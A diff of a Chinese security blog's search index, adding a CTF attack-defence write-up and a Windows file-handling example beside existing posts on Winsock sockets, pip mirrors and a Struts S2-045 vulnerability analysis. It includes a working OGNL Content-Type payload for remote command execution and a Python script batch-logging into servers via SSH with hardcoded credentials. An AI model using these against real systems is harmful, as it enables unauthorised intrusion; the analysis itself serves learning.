@@ -1,6 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[利用Python实现批量自动化SSH登陆并执行命令后获取数据]]></title>
+    <url>%2F2018%2F09%2F25%2F%E5%88%A9%E7%94%A8Python%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96SSH%E7%99%BB%E9%99%86%E5%B9%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%90%8E%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%2F</url>
+    <content type="text"><![CDATA[前言放假前辽宁省为了应景“网络安全宣传周”举办了一场安恒杯，初赛依靠大佬们的出色发挥进了决赛，奈何pwn大佬实习出差不能赶回来，我们两个Web只要赶鸭子上架，2 VS 3不过幸运的是最终获取了二等奖，遗憾的是离最终大奖只差一步一摇… 而能够获取这二等奖的原因，也是因为在最后一轮我发现了一个隐藏的用户名和密码，猜到了密码，就可以随意登陆别的队的服务器，然后执行curl命令来获取flag，但是当时不会写登陆ssh的脚本，导致我们两个手动连接30台服务器，累的要死。之后特意来学习一下 代码123456789101112131415161718192021from pexpect import pxssh#host = &apos;&apos;username = &apos;dbappp&apos;password = &apos;dbapp2018&apos;#port = for i in range(0,30): try: host = &quot;10.50.&quot;+str(i)+&quot;.2&quot; s = pxssh.pxssh() s.login(host, username, password) s.sendline(&apos;curl 10.0.1.2&apos;) s.prompt() result = str(s.before, encoding=&apos;utf-8&apos;).split(&apos;\r\n&apos;) print(&apos;Team&apos;+str(i)+&apos;:&apos;) print(result[1]) s.logout() except: print(&quot;pxssh failed on login.&quot;) 首先需要用到python的库pexpect，直接pip3 install pexpect安装即可。 首先pxssh.pxssh()进行初始化，然后直接s.login()登陆即可，这里默认是登陆22端口的，如果需要指定端口，则需要在login函数中指定port参数之后如果用户名密码正确的话，就登陆成功了，再然后使用s.sendline()就可以在服务器上执行命令了，而s.prompt()用来获取前后两个服务器登陆的标志，类似这样其中#井号就是这个标志，这个主要是用来获取两个井号之前的内容，然后利用s.before输出出来，但是我发现这样的话也会将我们输入的命令也获取到，因此我再这里进行了一些处理，就能够获取到flag了。 最后再来一波循环，批量登陆别的队伍的服务器然后获取flag。]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Python</tag>
+        <tag>SSH</tag>
+        <tag>AWD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows编程之文件操作]]></title>
+    <url>%2F2018%2F09%2F25%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[Windows编程之文件操作该程序主要功能就是创建一个文件，然后在文件的后面追加数据，之后将文件复制到上层目录，然后将其重命名，最后再删除。所应用到的windows函数有CreateFile, WriteFile, CopyFile, MoveFile, DeleteFile, SetFilePointer 代码123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; HANDLE hFile = CreateFile(argv[1], GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;Create failed\n&quot;); return 0; &#125; if (SetFilePointer(hFile, 0, NULL, FILE_END) == -1) &#123; printf(&quot;SetFilePointer error\n&quot;); return 0; &#125; char buff[] = &quot;配置信息&quot;; DWORD dwWrite; if (!WriteFile(hFile, &amp;buff, strlen(buff), &amp;dwWrite, NULL)) &#123; printf(&quot;Writer error\n&quot;); return 0; &#125; printf(&quot;往%s写入数据成功\n&quot;, argv[1]); char newCopyPath[] = &quot;../2.txt&quot;; char newMovePath[] = &quot;../3.txt&quot;; if (!CopyFile(argv[1], newCopyPath, FALSE)) &#123; printf(&quot;CopyFile error\n&quot;); return 0; &#125; if (!MoveFile(newCopyPath, newMovePath)) &#123; printf(&quot;MoveFile error\n&quot;); return 0; &#125; if (!DeleteFile(newMovePath)) &#123; printf(&quot;DeleteFile error\n&quot;); return 0; &#125; CloseHandle(hFile); return 0;&#125;]]></content>
+      <categories>
+        <category>Windows编程</category>
+      </categories>
+      <tags>
+        <tag>Windows编程</tag>
+        <tag>文件操作</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Windows网络编程]]></title>
     <url>%2F2018%2F09%2F24%2FWindows%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
     <content type="text"><![CDATA[前言因为在写代码的时候感觉用VS太过臃肿，每次写个程序还要创建一个项目，并且特别占用空间，因此安装了mingw，可以在命令行中直接gcc编译，特别方便，安利一下～并且在编译socket程序的时候，一定要加上-l wsock32选项，因为mingw默认没有包含windows库 TCP版本 SERVER端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;Winsock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (sListen == INVALID_SOCKET) &#123; printf(&quot;socket error\n&quot;); return 0; &#125; struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(4500); sin.sin_addr.S_un.S_addr = INADDR_ANY; if (bind(sListen, (LPSOCKADDR)&amp;sin, sizeof(sin)) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sListen); return 0; &#125; if (listen(sListen, 5) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sListen); return 0; &#125; struct sockaddr_in remoteAddr; SOCKET sClient; int nAddrLen = sizeof(remoteAddr); char revData[255]; while(TRUE)&#123; sClient = accept(sListen, (SOCKADDR*)&amp;remoteAddr, &amp;nAddrLen); if (sClient == SOCKET_ERROR) &#123; printf(&quot;accept() error\n&quot;); continue; &#125; printf(&quot;接受到一个连接：%s \r\n&quot;, inet_ntoa(remoteAddr.sin_addr)); int ret = recv(sClient, revData, 255, 0); if (ret &gt; 0) &#123; revData[ret] = 0x00; printf(revData); &#125; char* buff = (char*)&quot;\r\nHello, my friend\r\n&quot;; send(sClient, buff, strlen(buff), 0); closesocket(sClient); &#125; closesocket(sListen); WSACleanup(); return 0;&#125; CLIENT端 12345678910111213141516171819202122232425262728293031323334353637#include &lt;WinSock2.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main(int argc, char* argv[]) &#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET sClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (sClient == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); return 0; &#125; struct sockaddr_in servAddr; servAddr.sin_family = AF_INET; servAddr.sin_port = htons(4500); servAddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); if (connect(sClient, (SOCKADDR*)&amp;servAddr, sizeof(servAddr)) == SOCKET_ERROR) &#123; printf(&quot;socket error\n&quot;); closesocket(sClient); return 0; &#125; char* buff = (char*)&quot;\r\nHello, my friend\r\n&quot;; send(sClient, buff, strlen(buff), 0); char revData[255]; int ret = recv(sClient, revData, 255, 0); if (ret &gt; 0) &#123; revData[ret] = 0x00; printf(revData); &#125; closesocket(sClient); WSACleanup(); return 0;&#125; 编译 12gcc server.c -o server -lwsock32gcc client.c -o client -lwsock32 UDP版本 SERVER端 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; WSADATA wsaData; WORD sockVersion = MAKEWORD(2, 2); if (WSAStartup(sockVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); if (serSocket == INVALID_SOCKET) &#123; printf(&quot;socket error !&quot;); return 0; &#125; struct sockaddr_in serAddr; serAddr.sin_family = AF_INET; serAddr.sin_port = htons(8000); serAddr.sin_addr.S_un.S_addr = INADDR_ANY; if (bind(serSocket, (SOCKADDR*)&amp;serAddr, sizeof(serAddr)) == SOCKET_ERROR) &#123; printf(&quot;bind error !&quot;); closesocket(serSocket); return 0; &#125; struct sockaddr_in remoteAddr; int nAddrLen = sizeof(remoteAddr); while (TRUE) &#123; char recvData[255]; int ret = recvfrom(serSocket, recvData, 255, 0, (SOCKADDR*)&amp;remoteAddr, &amp;nAddrLen); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(&quot;接受到一个连接：%s \r\n&quot;, inet_ntoa(remoteAddr.sin_addr)); printf(recvData); &#125; char * sendData = &quot;一个来自服务端的UDP数据包\n&quot;; sendto(serSocket, sendData, strlen(sendData), 0, (SOCKADDR*)&amp;remoteAddr, nAddrLen); &#125; closesocket(serSocket); WSACleanup(); return 0;&#125; CLIENT端 123456789101112131415161718192021222324252627282930313233343536#include &lt;winsock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; WORD socketVersion = MAKEWORD(2, 2); WSADATA wsaData; if (WSAStartup(socketVersion, &amp;wsaData) != 0) &#123; return 0; &#125; SOCKET sclient = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_port = htons(8000); sin.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); int len = sizeof(sin); char * sendData = &quot;Hello, my friend\n&quot;; sendto(sclient, sendData, strlen(sendData), 0, (SOCKADDR*)&amp;sin, len); char recvData[255]; int ret = recvfrom(sclient, recvData, 255, 0, (SOCKADDR*)&amp;sin, &amp;len); if (ret &gt; 0) &#123; recvData[ret] = 0x00; printf(recvData); &#125; closesocket(sclient); WSACleanup(); return 0;&#125; 编译 12gcc server_udp.c -o server_udp -lwsock32gcc client_udp.c -o client_udp -lwsock32 总结对于TCP版本的程序来说1server 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》bind -》检测SOCKET_ERROR -》listen -》检测SOCKET_ERROR -》进入循环 -》accept -》检测SOCKET_ERROR -》接收、发送消息 1client 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》connect -》检测SOCKET_ERROR -》发送、接收消息 对于UDP版本的程序来说1server 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》bind -》检测SOCKET_ERROR -》进入循环 -》发送、接收消息 1client 端：创建WSAStartup -》检测!=0 -》创建socket -》检测SOCKET_ERROR -》声明sockaddr_in结构 -》发送、接收消息 TCP中，使用send和recv函数进行发送和接收消息UDP中，使用sendto和recvfrom函数进行发送和接收消息]]></content>
@@ -43,7 +69,7 @@
     <url>%2F2018%2F08%2F13%2FMac%E4%B8%8B%E6%9B%B4%E6%94%B9pip2-pip3%E5%9B%BD%E5%86%85%E6%BA%90%2F</url>
     <content type="text"><![CDATA[在使用Python的时候，经常会用到pip来安装模块，但是默认的下载源实在是特别慢，经常install的时候还会因为速度的原因直接报错，因此我们可以选择将下载源更改为国内的，这样就可以提高我们的下载速度了。 国内的知名下载源1234阿里云 ：http://mirrors.aliyun.com/pypi/simple/中国科学技术大学：https://pypi.mirrors.ustc.edu.cn/simple/清华大学：https://pypi.tuna.tsinghua.edu.cn/simple/豆瓣：http://pypi.douban.com/simple/ Mac下启动终端，输入如下命令123cd ~mkdir .piptouch pip.conf 创建pip.conf文件 然后我们打开pip.conf文件，输入以下内容：1234[global]index-url = https://pypi.tuna.tsinghua.edu.cn/simple/[install]trusted-host=pypi.tuna.tsinghua.edu.cn 然后python2的用户直接pip install xxxx，python3的用户直接pip3 install xxxx，可以看到速度真的是特别的快。]]></content>
       <categories>
-        <category>Mac Os</category>
+        <category>Mac OS</category>
       </categories>
       <tags>
         <tag>小贴士</tag>
@@ -142,7 +168,7 @@
     <url>%2F2018%2F06%2F19%2FS2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[0x01 前言最近在学习java安全，第一个目标就是Struts了，准备找一些比较典型的Struts漏洞进行一系列的分析。 0x02 漏洞分析 首先看下官方文档的描述 发现是在Content-Type处写入恶意的代码来进行代码执行的，然后选择下载Struts 2.3.31和Struts 2.3.32两个版本进行对比研究 丢进Beyond Compare中看一看发现dispatcher.multipart包中的三个java文件有不同，我们可以看到Jakarta字样，Jakarta是Struts2默认的上传处理配置，因此我们可以知道应该是要模拟上传行为来触发漏洞。 点开这三个java文件，我们可以发现其实修复的处理都是一样的 总结一下就是把1LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args); 这里的e.getMessage()换成了null，所以我们推测应该是报错信息出现的问题把。我们直接本地搭建一个上传点，然后开burp拦截，启动debug模式，在上面的地方下断点，进行调试看看，因为需要报错信息才能触发漏洞，所以我就直接在Content-Type处直接加了个123，解析肯定会报错的 这里有一个小技巧就是我们把这个上传包send to repeat一下，这样之后重新调试的时候直接go一下就可以了，不用每次都抓包，很麻烦。 然后我们Go一下，程序会停在断点处 然后我们单步进入 发现之前findText处的e.getMessage()处变成了defaultMessage，并且看一下监视器，发现这个变量前面是固定报错信息，但是后面拼接了我们出入的Content-Type字段的数据。 这个时候还不明朗，继续往下走，进入findText函数内部 其实这里我发现一点，那就是官方文档中已经说明了findText方法的作用，大致意思就是：如果Content-Type解析错误了，那么他就要找到指定的aTextName变量的本地化消息，如果在aClass变量指定的包中没有找到，就继续在上一个包中找，一直循环，直到obj包。并且有一点就是，官方文档明确说明了错误信息会被当作ognl表达式在解析 先记着吧，我们继续往下看。 往下走发现有一个findMessage函数，进去看看 发现就是并没有什么用，都是返回的null 之后到了下面有一个循环这个循环就是之前说的那个在aClass变量执行的包中找，如果找不到就在上一个包中找，发现他会一直到obj包中都还没有找到 继续走，发现了一个敏感函数，getDefaultMessage。因为我们之前是直到的，defaultMessage变量是我们可控的，进去看一下 找的了！之前分析S2-016的时候我们直到在translateVariables函数中是可以执行ognl表达式的，看一下这里的message参数， 刚好是我们们出入的defaultMessage，可控！ 继续进入后，看到 那么payload的写法还是%{}或者${} 最后进入到执行ognl表达式的函数中就会发现他是只执行${xxx}或者%{xxx}中的xxx的，所以并不用担心defaultMessage中系统自带的那些报错信息 0x03 exp编写回溯buildErrorMessage函数,发现其在parse函数执行回溯parse函数，发现其在MultiPartRequestWrapper函数中执行回溯MultiPartRequestWrapper函数，发现其在dispatcher.wrapRequest函数中执行但是我们发现，在获取Content-Type之后，有一个if判断，就是说Content-Type中必须得有multipart/form-data，才会执行之后的函数，所以编写exp的时候必须要有multipart/form-data字符串才行。 再回溯到了PrepareOperations.wrapRequest再回溯到了StrutsPrepareAndExecuteFilter.doFilter 1%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 0x04 总结 Jarkata解析器是默认的文件上传解析器 core包中的struts-default.xml中存在类成员访问的黑名单功能]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>漏洞分析与复现</category>
       </categories>
       <tags>
         <tag>漏洞分析</tag>
@@ -318,9 +344,9 @@
         <category>移动安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>移动安全</tag>
         <tag>安卓</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -331,9 +357,9 @@
         <category>移动安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>移动安全</tag>
         <tag>安卓</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -344,9 +370,9 @@
         <category>移动安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>移动安全</tag>
         <tag>安卓</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -357,9 +383,9 @@
         <category>移动安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>移动安全</tag>
         <tag>安卓</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -370,9 +396,9 @@
         <category>移动安全</category>
       </categories>
       <tags>
+        <tag>CTF</tag>
         <tag>移动安全</tag>
         <tag>安卓</tag>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -591,8 +617,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>后渗透</tag>
         <tag>Mssql</tag>
+        <tag>后渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -604,8 +630,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>后渗透</tag>
         <tag>Mssql</tag>
+        <tag>后渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -792,10 +818,10 @@
         <category>渗透测试</category>
       </categories>
       <tags>
+        <tag>SSH</tag>
         <tag>内网渗透</tag>
         <tag>内网穿透</tag>
         <tag>端口转发</tag>
-        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
